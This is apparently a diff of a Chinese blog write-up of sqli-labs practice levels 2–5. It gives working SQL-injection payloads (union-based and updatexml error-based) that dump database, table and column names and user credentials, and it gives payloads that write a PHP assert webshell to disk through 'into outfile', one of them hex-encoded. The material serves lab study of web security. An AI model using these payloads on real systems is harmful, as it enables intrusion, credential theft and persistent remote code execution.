+<p>Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin</p>
 </blockquote>
-<p>按顺序对应 username 和 password<br>
- 如果想更好的查看对应的 username 和 password<br>
- 可以添加 limit 0,1 将 group_concat () 删去</p>
+<p>按顺序对应username和password<br>如果想更好的查看对应的username和password<br>可以添加limit 0,1将group_concat()删去</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,username,password from users limit 0,1 --+</span><br><span class="line">limit 1,1</span><br><span class="line">limit 2,1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>通过这样的方法就能得到所有的 username 和 password</p>
-<h4 id="写入webshell"><a class="markdownIt-Anchor" href="#写入webshell">#</a> 写入 webshell</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,2,&#x27;&lt;?php assert($_POST[Less2]);?&gt;&#x27; into outfile &#x27;C:/less2.php&#x27; --+</span><br></pre></td></tr></table></figure>
-<p>这样能在 c 盘中找到 less2.php 文件<br>
-内容就为</p>
+
+<p>通过这样的方法就能得到所有的username和password</p>
+<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,2,&#x27;&lt;?php assert($_POST[Less2]);?&gt;&#x27; into outfile &#x27;C:/less2.php&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p>这样能在c盘中找到less2.php文件<br>内容就为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php assert($_POST[Less2]);?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="sqli-labs-3"><a class="markdownIt-Anchor" href="#sqli-labs-3">#</a> sqli-labs-3</h2>
-<h4 id="初步判断-2"><a class="markdownIt-Anchor" href="#初步判断-2">#</a> 初步判断</h4>
-<h5 id="判断一下是否回显"><a class="markdownIt-Anchor" href="#判断一下是否回显">#</a> 判断一下是否回显</h5>
-<p>输入正确的 url</p>
+
+<h2 id="sqli-labs-3"><a href="#sqli-labs-3" class="headerlink" title="sqli-labs-3"></a>sqli-labs-3</h2><h4 id="初步判断-1"><a href="#初步判断-1" class="headerlink" title="初步判断"></a>初步判断</h4><h5 id="判断一下是否回显"><a href="#判断一下是否回显" class="headerlink" title="判断一下是否回显"></a>判断一下是否回显</h5><p>输入正确的url</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:Dumb<br>
-Your Password:Dumb</p>
+<p>Your Login name:Dumb<br>Your Password:Dumb </p>
 </blockquote>
 <p>说明会回显</p>
-<h5 id="判断需要闭合什么符号"><a class="markdownIt-Anchor" href="#判断需要闭合什么符号">#</a> 判断需要闭合什么符号</h5>
-<p>在 url 后面添加’</p>
+<h5 id="判断需要闭合什么符号"><a href="#判断需要闭合什么符号" class="headerlink" title="判断需要闭合什么符号"></a>判断需要闭合什么符号</h5><p>在url后面添加’</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’) LIMIT 0,1’ at line 1</p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1</p>
 </blockquote>
 <p>说明我们需要闭合一个)</p>
-<h5 id="判断是什么型注入"><a class="markdownIt-Anchor" href="#判断是什么型注入">#</a> 判断是什么型注入</h5>
-<p>运用 and 1=1 和 1=2</p>
+<h5 id="判断是什么型注入"><a href="#判断是什么型注入" class="headerlink" title="判断是什么型注入"></a>判断是什么型注入</h5><p>运用and 1&#x3D;1和1&#x3D;2</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 --+</span><br></pre></td></tr></table></figure>
+
 <p>此时页面异常，说明是数字型注入</p>
-<h4 id="获取列数"><a class="markdownIt-Anchor" href="#获取列数">#</a> 获取列数</h4>
-<p>用 order by 1，order by 2 … 直至 order by 4<br>
- 此时报错<br>
-页面显示</p>
+<h4 id="获取列数"><a href="#获取列数" class="headerlink" title="获取列数"></a>获取列数</h4><p>用order by 1，order by 2 …直至order by 4<br>此时报错<br>页面显示</p>
 <blockquote>
 <p>Unknown column ‘4’ in ‘order clause’</p>
 </blockquote>
 <p>从而可得知列数有三列</p>
-<h4 id="获取数据库名称"><a class="markdownIt-Anchor" href="#获取数据库名称">#</a> 获取数据库名称</h4>
-<p>用联合注入 union select 判断哪些字段会回显</p>
+<h4 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h4><p>用联合注入union select判断哪些字段会回显</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:2<br>
-Your Password:3</p>
+<p>Your Login name:2<br>Your Password:3</p>
 </blockquote>
-<p>得到 2，3 字段会回显后直接用 database () 获取数据库</p>
+<p>得到2，3字段会回显后直接用database()获取数据库</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) and 1=2 union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:security<br>
-Your Password:3</p>
+<p>Your Login name:security<br>Your Password:3</p>
 </blockquote>
-<p>得到数据库名称为 security</p>
-<h4 id="获取所有表名"><a class="markdownIt-Anchor" href="#获取所有表名">#</a> 获取所有表名</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>得到数据库名称为security</p>
+<h4 id="获取所有表名"><a href="#获取所有表名" class="headerlink" title="获取所有表名"></a>获取所有表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:emails,referers,uagents,users<br>
-Your Password:3</p>
+<p>Your Login name:emails,referers,uagents,users<br>Your Password:3</p>
 </blockquote>
-<p>得到数据库的所有表名为<strong> emails,referers,uagents,users</strong></p>
-<h4 id="获取数据库中users表的所有列名"><a class="markdownIt-Anchor" href="#获取数据库中users表的所有列名">#</a> 获取数据库中 users 表的所有列名</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = &#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>得到数据库的所有表名为<strong>emails,referers,uagents,users</strong></p>
+<h4 id="获取数据库中users表的所有列名"><a href="#获取数据库中users表的所有列名" class="headerlink" title="获取数据库中users表的所有列名"></a>获取数据库中users表的所有列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = &#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:email_id,id,id,ip_address,referer,id,ip_address,uagent,username,id,password,username<br>
-Your Password:3</p>
+<p>Your Login name:email_id,id,id,ip_address,referer,id,ip_address,uagent,username,id,password,username<br>Your Password:3</p>
 </blockquote>
-<p>得到 users 表中的所有列名</p>
-<h4 id="爆出users表中的所有username和password"><a class="markdownIt-Anchor" href="#爆出users表中的所有username和password">#</a> 爆出 users 表中的所有 username 和 password</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure>
+<p>得到users表中的所有列名</p>
+<h4 id="爆出users表中的所有username和password"><a href="#爆出users表中的所有username和password" class="headerlink" title="爆出users表中的所有username和password"></a>爆出users表中的所有username和password</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin<br>
-Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin</p>
+<p>Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin</p>
 </blockquote>
-<p>依次对应各个 username 和 password</p>
-<h4 id="写入webshelll"><a class="markdownIt-Anchor" href="#写入webshelll">#</a> 写入 webshelll</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,2,&#x27;&lt;?php assert($_POST[Less3]);?&gt;&#x27; into outfile &#x27;C:/Less3.php&#x27; --+</span><br></pre></td></tr></table></figure>
-<p>可以在路径中找到 Less3.php，里面的内容为</p>
+<p>依次对应各个username和password</p>
+<h4 id="写入webshelll"><a href="#写入webshelll" class="headerlink" title="写入webshelll"></a>写入webshelll</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;) and 1=2 union select 1,2,&#x27;&lt;?php assert($_POST[Less3]);?&gt;&#x27; into outfile &#x27;C:/Less3.php&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p>可以在路径中找到Less3.php，里面的内容为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php assert($_POST[Less3]);?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="sqli-labs-4"><a class="markdownIt-Anchor" href="#sqli-labs-4">#</a> sqli-labs-4</h2>
-<h4 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h4>
-<p>如果字段本身是 int 类型，并且在查询语句中该字段的值被双引号或者单引号包裹，则只要值是以正确数字开头的，后面接多余的字符还是可以返回正确的查询结果，甚至单引号中可以包含双引号，双引号中可以包含单引号。<br>
-如：</p>
+
+<h2 id="sqli-labs-4"><a href="#sqli-labs-4" class="headerlink" title="sqli-labs-4"></a>sqli-labs-4</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>如果字段本身是int类型，并且在查询语句中该字段的值被双引号或者单引号包裹，则只要值是以正确数字开头的，后面接多余的字符还是可以返回正确的查询结果，甚至单引号中可以包含双引号，双引号中可以包含单引号。<br>如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id = &quot;1&#x27;m&quot;</span><br></pre></td></tr></table></figure>
+
 <p>学习连接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/elephantxiang/article/details/119684515">https://blog.csdn.net/elephantxiang/article/details/119684515</a></p>
-<h4 id="初步判断-3"><a class="markdownIt-Anchor" href="#初步判断-3">#</a> 初步判断</h4>
-<p>输入正确的 id</p>
+<h4 id="初步判断-2"><a href="#初步判断-2" class="headerlink" title="初步判断"></a>初步判断</h4><p>输入正确的id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:Dumb<br>
-Your Password:Dumb</p>
+<p>Your Login name:Dumb<br>Your Password:Dumb</p>
 </blockquote>
-<p>说明会回显<br>
-输入’<br>
-发现页面没有报错<br>
-接着输入 &quot;</p>
+<p>说明会回显<br>输入’<br>发现页面没有报错<br>接着输入”</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot;</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1&quot;”) LIMIT 0,1’ at line 1</p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at line 1</p>
 </blockquote>
-<p>由此可知，本题的闭合为 &quot;)</p>
-<p>有 and 1=1 和 and1=2 判断是字符型注入还是数字型注入</p>
+<p>由此可知，本题的闭合为”)</p>
+<p>有and 1&#x3D;1和and1&#x3D;2判断是字符型注入还是数字型注入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot;) and 1=2 --+</span><br></pre></td></tr></table></figure>
+
 <p>此时页面显示异常，说明是数字型注入</p>
-<h4 id="判断列数"><a class="markdownIt-Anchor" href="#判断列数">#</a> 判断列数</h4>
-<p>order by 1/2/3/4<br>
-4 时报错，内容和前三关一致，这里就一一列出</p>
-<h4 id="判断回显字段"><a class="markdownIt-Anchor" href="#判断回显字段">#</a> 判断回显字段</h4>
-<p>用联合注入 union select 1,2,3，然后 2,3 回显这里也不一一列出了</p>
-<h4 id="获取数据库名称-2"><a class="markdownIt-Anchor" href="#获取数据库名称-2">#</a> 获取数据库名称</h4>
-<p>在可回显的字段里换成 database ()<br>
-union select 1,database(),3<br>
- 也和前三关一样也就不一一列出了<br>
-得到数据库名称为 database ()</p>
-<h4 id="获取所有的数据"><a class="markdownIt-Anchor" href="#获取所有的数据">#</a> 获取所有的数据</h4>
-<p>这里的操作和前三关都一样就不一一列出了</p>
-<h2 id="sqli-labs-5"><a class="markdownIt-Anchor" href="#sqli-labs-5">#</a> sqli-labs-5</h2>
-<h4 id="本关涉及内容"><a class="markdownIt-Anchor" href="#本关涉及内容">#</a> 本关涉及内容</h4>
-<h5 id="updatexml"><a class="markdownIt-Anchor" href="#updatexml">#</a> updatexml()</h5>
-<p>updatexml(xml_doument,XPath_string,new_value)<br>
- 第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc<br>
- 第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。<br>
-第三个参数：new_value，String 格式，替换查找到的符合条件的数据</p>
-<p>updatexml(xml_doument,XPath_string,new_value)<br>
- 第一个参数：XML 的内容<br>
-第二个参数：是需要 update 的位置 XPATH 路径<br>
-第三个参数：是更新后的内容<br>
-所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式<br>
-函数利用和语法明白了，下面注入的 payload 就清楚明白</p>
-<p><strong>updatexml 最多只能显示 32 位，需要配合 SUBSTR 使用</strong></p>
-<h5 id="concat"><a class="markdownIt-Anchor" href="#concat">#</a> concat()</h5>
-<p>用于连接字符串</p>
-<h5 id="substr"><a class="markdownIt-Anchor" href="#substr">#</a> substr()</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(strings|express,m,[n])</span><br></pre></td></tr></table></figure>
-<p>strings|express ：被截取的字符串或字符串表达式<br>
- m ：从第 m 个字符开始截取<br>
- n ：截取后字符串长度为 n</p>
-<h5 id="select-distinct"><a class="markdownIt-Anchor" href="#select-distinct">#</a> select distinct()</h5>
-<p>这个函数本关可以不用到，但是看到了就把他记下来<br>
-用法如下：</p>
+<h4 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h4><p>order by 1&#x2F;2&#x2F;3&#x2F;4<br>4时报错，内容和前三关一致，这里就一一列出</p>
+<h4 id="判断回显字段"><a href="#判断回显字段" class="headerlink" title="判断回显字段"></a>判断回显字段</h4><p>用联合注入union select 1,2,3，然后2,3回显这里也不一一列出了</p>
+<h4 id="获取数据库名称-1"><a href="#获取数据库名称-1" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h4><p>在可回显的字段里换成database()<br>union select 1,database(),3<br>也和前三关一样也就不一一列出了<br>得到数据库名称为database()</p>
+<h4 id="获取所有的数据"><a href="#获取所有的数据" class="headerlink" title="获取所有的数据"></a>获取所有的数据</h4><p>这里的操作和前三关都一样就不一一列出了</p>
+<h2 id="sqli-labs-5"><a href="#sqli-labs-5" class="headerlink" title="sqli-labs-5"></a>sqli-labs-5</h2><h4 id="本关涉及内容"><a href="#本关涉及内容" class="headerlink" title="本关涉及内容"></a>本关涉及内容</h4><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>updatexml(xml_doument,XPath_string,new_value)<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+<p>updatexml(xml_doument,XPath_string,new_value)<br>第一个参数：XML的内容<br>第二个参数：是需要update的位置XPATH路径<br>第三个参数：是更新后的内容<br>所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式<br>函数利用和语法明白了，下面注入的payload就清楚明白</p>
+<p><strong>updatexml最多只能显示32位，需要配合SUBSTR使用</strong></p>
+<h5 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h5><p>用于连接字符串</p>
+<h5 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(strings|express,m,[n])</span><br></pre></td></tr></table></figure>
+
+<p>strings|express ：被截取的字符串或字符串表达式<br>m ：从第m个字符开始截取<br>n ：截取后字符串长度为n</p>
+<h5 id="select-distinct"><a href="#select-distinct" class="headerlink" title="select distinct()"></a>select distinct()</h5><p>这个函数本关可以不用到，但是看到了就把他记下来<br>用法如下：</p>
 <blockquote>
 <p>SELECT DISTINCT 表示查询结果中，去掉了重复的行</p>
 </blockquote>
-<p>百度的一个例子：<br>
-如果要从 “Company” 列中选取所有的值，我们需要使用 SELECT 语句：</p>
+<p>百度的一个例子：<br>如果要从 “Company” 列中选取所有的值，我们需要使用 SELECT 语句：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Company FROM Orders</span><br></pre></td></tr></table></figure>
+
 <p><strong>Orders</strong></p>
 <table>
 <thead>
@@ -3021,8 +2896,7 @@ union select 1,database(),3<br>
 <th>Num</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>IBM</td>
 <td>3532</td>
 </tr>
@@ -3038,8 +2912,7 @@ union select 1,database(),3<br>
 <td>W3School</td>
 <td>6953</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p><strong>结果</strong></p>
 <table>
 <thead>
@@ -3047,8 +2920,7 @@ union select 1,database(),3<br>
 <th>Company</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>IBM</td>
 </tr>
 <tr>
@@ -3064,11 +2936,13 @@ union select 1,database(),3<br>
 <td>请注意，在结果集中，W3School 被列出了两次。</td>
 </tr>
 <tr>
-<td>如需从 Company&quot; 列中仅选取唯一不同的值，我们需要使用 SELECT DISTINCT 语句：</td>
+<td>如需从 Company” 列中仅选取唯一不同的值，我们需要使用 SELECT DISTINCT 语句：</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT Company FROM Orders</span><br></pre></td></tr></table></figure>
+
+
+
 <p><strong>结果</strong></p>
 <table>
 <thead>
@@ -3076,8 +2950,7 @@ union select 1,database(),3<br>
 <th>Company</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>IBM</td>
 </tr>
 <tr>
@@ -3086,237 +2959,205 @@ union select 1,database(),3<br>
 <tr>
 <td>Apple</td>
 </tr>
-</tbody>
-</table>
-<p>在结果集中，“W3School” 仅被列出了一次。</p>
-<h4 id="初步判断-4"><a class="markdownIt-Anchor" href="#初步判断-4">#</a> 初步判断</h4>
-<p>输入正确的 id</p>
+</tbody></table>
+<p>在结果集中，”W3School” 仅被列出了一次。</p>
+<h4 id="初步判断-3"><a href="#初步判断-3" class="headerlink" title="初步判断"></a>初步判断</h4><p>输入正确的id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>You are in…</p>
+<p>You are in………..</p>
 </blockquote>
-<p>说明本关不回显<br>
-添加’后，发现页面还是会报错的</p>
+<p>说明本关不回显<br>添加’后，发现页面还是会报错的</p>
 <blockquote>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1</p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
 </blockquote>
 <p>可以看出本关还是单引号闭合</p>
-<h4 id="获取数据库名称-3"><a class="markdownIt-Anchor" href="#获取数据库名称-3">#</a> 获取数据库名称</h4>
-<p>这里用到报错注入</p>
+<h4 id="获取数据库名称-2"><a href="#获取数据库名称-2" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h4><p>这里用到报错注入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+
 <p>此时页面显示</p>
 <blockquote>
-<p>XPATH syntax error: ‘<sub>security</sub>’</p>
+<p>XPATH syntax error: ‘<del>security</del>‘</p>
 </blockquote>
-<p>得到数据库名称为<strong> security</strong></p>
-<h4 id="获取所有表名-2"><a class="markdownIt-Anchor" href="#获取所有表名-2">#</a> 获取所有表名</h4>
-<p>这里用到 updatexml ()</p>
+<p>得到数据库名称为<strong>security</strong></p>
+<h4 id="获取所有表名-1"><a href="#获取所有表名-1" class="headerlink" title="获取所有表名"></a>获取所有表名</h4><p>这里用到updatexml()</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;),1,31),0x7e),1) --+</span><br></pre></td></tr></table></figure>
-<p>因为 updatexml () 函数只能显示 32 位，防止一次性爆出所有表名太长了这里使用 substr () 限制输出的位数<br>
-页面显示</p>
+
+<p>因为updatexml()函数只能显示32位，防止一次性爆出所有表名太长了这里使用substr()限制输出的位数<br>页面显示</p>
 <blockquote>
-<p>XPATH syntax error: ‘<sub>emails,referers,uagents,users</sub>’</p>
+<p>XPATH syntax error: ‘<del>emails,referers,uagents,users</del>‘</p>
 </blockquote>
-<p>得到所有的表名为<strong> emails,referers,uagents,users</strong></p>
-<h4 id="获取users所有列名"><a class="markdownIt-Anchor" href="#获取users所有列名">#</a> 获取 users 所有列名</h4>
-<p>这里采用 limit 0,1 限制一次性爆出列名的数量</p>
+<p>得到所有的表名为<strong>emails,referers,uagents,users</strong></p>
+<h4 id="获取users所有列名"><a href="#获取users所有列名" class="headerlink" title="获取users所有列名"></a>获取users所有列名</h4><p>这里采用limit 0,1限制一次性爆出列名的数量</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name = &#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>XPATH syntax error: ‘<sub>id</sub>’</p>
+<p> XPATH syntax error: ‘<del>id</del>‘</p>
 </blockquote>
-<p>按顺序增加<br>
- limit 1,1<br>
-limit 2,1<br>
-…<br>
- 直到页面异常<br>
-可以得出所有的列名为<strong> id,username,password</strong></p>
-<p>这里再尝试一下 group_concat 看看能不能一次性爆出所有的列名，看网上的教程说报错注入不能使用 group_concat 一次性获取所有的列名，尝试一下会出现什么情况</p>
+<p>按顺序增加<br>limit 1,1<br>limit 2,1<br>…<br>直到页面异常<br>可以得出所有的列名为<strong>id,username,password</strong></p>
+<p>这里再尝试一下group_concat看看能不能一次性爆出所有的列名，看网上的教程说报错注入不能使用group_concat一次性获取所有的列名，尝试一下会出现什么情况</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema=&#x27;security&#x27;),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>XPATH syntax error: ‘<sub>id,username,password</sub>’</p>
+<p>XPATH syntax error: ‘<del>id,username,password</del>‘</p>
 </blockquote>
-<p>得出还是能正常使用并得出所有列名的，我猜测应该是 updatexml () 只能显示 32 位，刚好这些列名没有超出 32 位就没有什么问题了<br>
-这里有使用 updatexml () 和 group_conat () 来获取 users 表里的所有 username 来验证一下</p>
+<p>得出还是能正常使用并得出所有列名的，我猜测应该是updatexml()只能显示32位，刚好这些列名没有超出32位就没有什么问题了<br>这里有使用updatexml()和group_conat()来获取users表里的所有username来验证一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and updatexml(1,concat(0x7e,(select concat(0x7e,(select group_concat(username)),0x7e) from users),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
 <p>XPATH syntax error: ‘~~Dumb,Angelina,Dummy,secure,stu’</p>
 </blockquote>
-<p>很明显可以看出 username 没有完全爆出，这里数了一下’‘里的内容确实只有 32 位<br>
-证明我的想法可能是对的’<doge>’<br>
-好了，回归正题</doge></p>
-<h4 id="获取所有username和password"><a class="markdownIt-Anchor" href="#获取所有username和password">#</a> 获取所有 username 和 password</h4>
-<p>既然上面验证了 updatexml 和 group_concat 同时使用可能会发生的事情，这里就不会 “误入歧途” 了<br>
-直接用 limit 依次获取所有的 username 和 password</p>
+<p>很明显可以看出username没有完全爆出，这里数了一下’’里的内容确实只有32位<br>证明我的想法可能是对的’<doge>‘<br>好了，回归正题</doge></p>
+<h4 id="获取所有username和password"><a href="#获取所有username和password" class="headerlink" title="获取所有username和password"></a>获取所有username和password</h4><p>既然上面验证了updatexml和group_concat同时使用可能会发生的事情，这里就不会“误入歧途”了<br>直接用limit依次获取所有的username和password</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and updatexml(1,concat(0x7e,(select (select concat(username,0x7e,password)) from users limit 0,1),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>XPATH syntax error: ‘<sub>Dumb</sub>Dumb~’</p>
+<p>XPATH syntax error: ‘<del>Dumb</del>Dumb~’</p>
 </blockquote>
-<p>得出第一组 username 和 password 为 Dumb 和 Dumb<br>
- 下面就不一一列出了就是 limit 1,1、limit 2,1 按顺序加上去就好了</p>
-<h4 id="写入webshell-2"><a class="markdownIt-Anchor" href="#写入webshell-2">#</a> 写入 webshell</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; into outfile &#x27;C:/less5.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e --+</span><br></pre></td></tr></table></figure>
-<p>这里的这串 16 进制 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e 通过 16 进制转字符串可翻译为</p>
+<p>得出第一组username和password为Dumb和Dumb<br>下面就不一一列出了就是limit 1,1、limit 2,1按顺序加上去就好了</p>
